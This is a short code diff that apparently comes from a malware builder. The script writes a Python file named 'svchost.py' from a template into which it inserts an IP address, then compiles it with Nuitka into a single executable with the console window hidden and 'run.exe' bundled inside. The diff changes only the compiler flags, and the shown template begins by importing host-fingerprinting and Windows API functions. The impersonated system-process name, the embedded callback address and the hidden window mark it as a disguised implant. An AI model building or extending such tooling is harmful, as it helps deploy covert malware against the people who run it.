@@ -6,7 +6,7 @@ def nuitka()->None:
     with open("svchost.py","w") as file:
         file.write(buf%ip_address)
     environ["CCFLAGS"]="-O3"
-    system("nuitka .\\svchost.py --onefile --remove-output --windows-console-mode=disable --include-data-files=.\\run.exe=.\\run.exe")
+    system("nuitka .\\svchost.py --mode=accelerated --mode=onefile --remove-output --windows-console-mode=disable --include-data-files=.\\run.exe=.\\run.exe")
     exit(0)
 buf=r'''from platform import node,release,machine,processor
 from ctypes import windll
